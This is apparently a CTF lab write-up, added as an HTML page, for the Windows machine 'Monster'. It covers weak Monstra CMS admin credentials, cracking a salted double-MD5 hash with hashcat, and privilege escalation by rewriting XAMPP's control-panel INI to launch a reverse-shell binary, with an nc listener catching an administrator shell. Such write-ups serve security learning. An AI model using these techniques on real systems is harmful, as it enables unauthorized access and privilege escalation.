@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Monster &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Monster</h1>
+    <div class="meta">Target: <code>192.168.114.180</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">MonstraCMS</span><span class="tag">MD5</span><span class="tag">hashcat</span><span class="tag">RDP</span><span class="tag">XAMPP</span><span class="tag">ServiceHijack</span><span class="tag">CredentialHunting</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#monstra-cms-admin-access-via-weak-credentials">Monstra CMS, Admin Access via Weak Credentials</a><a class="lvl3" href="#extracting-and-cracking-the-salted-hash">Extracting and Cracking the Salted Hash</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#xampp-control-panel-editor-path-hijack-searchsploit-50377">XAMPP Control Panel Editor Path Hijack (searchsploit 50377)</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Monster is a Windows machine running a Monstra 3.0.4 CMS over XAMPP. The foothold involves guessing weak admin credentials, extracting a salted double-MD5 hash from a CMS backup, and cracking it with a custom hashcat rule to recover a second user's password for RDP access. Privilege escalation exploits an insecure path in XAMPP's control panel INI file (searchsploit 50377 adapted to version 7.3.10), which lets a low-privileged user redirect the editor binary to a malicious payload that runs as administrator.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>The web server ran Apache 2.4.41 on Windows with PHP 7.3.10. Directory brute-force revealed <code>/blog</code>, which redirected to <code>monster.pg</code>, added to <code>/etc/hosts</code>. That path served a Monstra CMS login panel.</p>
+<blockquote>
+<p><strong>Why adding the hostname to <code>/etc/hosts</code> matters:</strong> virtual hosting means the web server returns different content depending on the <code>Host:</code> header. Without the correct hostname, you hit a default page; with it, you reach the real application. Never skip this step when a redirect reveals a domain name.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="monstra-cms-admin-access-via-weak-credentials">Monstra CMS, Admin Access via Weak Credentials</h3>
+<p>Monstra 3.0.4 was the target. After gathering context from the site, credential guessing with related terms produced a hit:</p>
+<pre><code>admin : wazowski
+</code></pre>
+<p>The CMS admin panel was now accessible.</p>
+<h3 id="extracting-and-cracking-the-salted-hash">Extracting and Cracking the Salted Hash</h3>
+<p>The CMS admin panel included a "Create Backup" function. The resulting zip contained <code>users.table.xml</code> at:</p>
+<pre><code>C:/xampp/htdocs/blog/storage/database/
+</code></pre>
+<p>Extracted user entries:</p>
+<pre><code>admin  : ‹redacted›  (wazowski@monster.pg)
+mike   : ‹redacted›  (mike@monster.pg)
+</code></pre>
+<p>The hashes appeared to be MD5 but resisted standard cracking. Checking the Monstra source revealed the hashing scheme:</p>
+<pre><code class="language-php">// defines.php
+define('MONSTRA_PASSWORD_SALT', 'YOUR_SALT_HERE');
+
+// hash function
+return md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));
+</code></pre>
+<p>This is double-MD5 with a known salt appended. Hashcat mode 2600 handles <code>md5(md5($pass))</code>. The salt is appended to the wordlist entries using a rule file, where <code>_</code> is escaped as <code>\x5F</code>:</p>
+<pre><code>$Y $O $U $R $\x5F $S $A $L $T $\x5F $H $E $R $E
+</code></pre>
+<blockquote>
+<p><strong>Why hashcat rules let you crack salted double-MD5:</strong> a rule file tells hashcat to transform each candidate password before hashing. Here, appending the known salt string to every rockyou entry reconstructs the exact input <code>md5()</code> received. Mode 2600 then handles the double-MD5 computation. This is why knowing the salt and algorithm matters, the crack becomes a dictionary attack again, not a brute-force.</p>
+</blockquote>
+<p>Running hashcat against mike's hash:</p>
+<pre><code class="language-sh">hashcat -m 2600 hash.txt --wordlist /usr/share/wordlists/rockyou.txt -r rule.txt
+‹redacted›:‹redacted›
+</code></pre>
+<p>Recovered password:</p>
+<pre><code>mike : ‹redacted›
+</code></pre>
+<p>RDP access confirmed:</p>
+<pre><code class="language-sh">xfreerdp /u:&quot;mike&quot; /p:&quot;‹redacted›&quot; /v:192.168.114.180
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="xampp-control-panel-editor-path-hijack-searchsploit-50377">XAMPP Control Panel Editor Path Hijack (searchsploit 50377)</h3>
+<p>WinPEAS surfaced the XAMPP Apache process running:</p>
+<pre><code>C:\xampp\apache\bin\httpd.exe
+</code></pre>
+<p>XAMPP version 7.3.10. ExploitDB 50377 targets XAMPP 7.4.3 but the same logic applies to 7.3.10. The <code>xampp-control.ini</code> file stores the path to the editor binary launched by the XAMPP control panel, and that file is writable by non-admin users.</p>
+<p>Checking the INI:</p>
+<pre><code class="language-powershell">PS C:\users\Mike\Desktop&gt; type C:\xampp\xampp-control.ini
+[Common]
+Edition=
+Editor=notepad.exe
+</code></pre>
+<p>Replacing the editor path with a malicious reverse-shell exe:</p>
+<pre><code class="language-powershell">$file = &quot;C:\xampp\xampp-control.ini&quot;
+$find = ((Get-Content $file)[2] -Split &quot;=&quot;)[1]
+$replace = &quot;C:\Users\mike\Desktop\shell.exe&quot;
+(Get-Content $file) -replace $find, $replace | Set-Content $file
+</code></pre>
+<p>Verifying the change:</p>
+<pre><code class="language-powershell">PS C:\users\Mike\Desktop&gt; type C:\xampp\xampp-control.ini
+[Common]
+Edition=
+Editor=C:\Users\mike\Desktop\shell.exe
+</code></pre>
+<blockquote>
+<p><strong>How the INI editor path becomes code execution:</strong> the XAMPP control panel reads this INI on startup and calls the configured editor path when an admin clicks "Edit config." If the control panel runs with elevated privileges, as it typically does when launched from a privileged context or scheduled task, then whatever binary sits at the <code>Editor=</code> path runs with that elevated token. Writing a shell path there turns a config option into a privilege escalation primitive.</p>
+</blockquote>
+<p>After waiting for an admin to interact with the control panel, the shell connected back:</p>
+<pre><code class="language-sh">sudo rlwrap nc -lvnp 80
+connect to [192.168.45.172] from (UNKNOWN) [192.168.114.180] 50438
+
+C:\WINDOWS\system32&gt;whoami
+mike-pc\administrator
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt;type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>CMS backup functions are goldmines.</strong> An admin "export" option handed over the entire user table, including all password hashes and salts.</li>
+<li><strong>Knowing the hash algorithm converts salted hashes into a tractable dictionary attack.</strong> The Monstra source code is public; reading it reduced the problem from "salted MD5" (hard) to "double-MD5 with known salt" (easy with the right hashcat rule).</li>
+<li><strong>XAMPP's control INI is a writable escalation path on shared-host installs.</strong> Any <code>Editor=</code> value in <code>xampp-control.ini</code> that a low-priv user can overwrite becomes privilege escalation if an admin process ever reads and acts on it.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
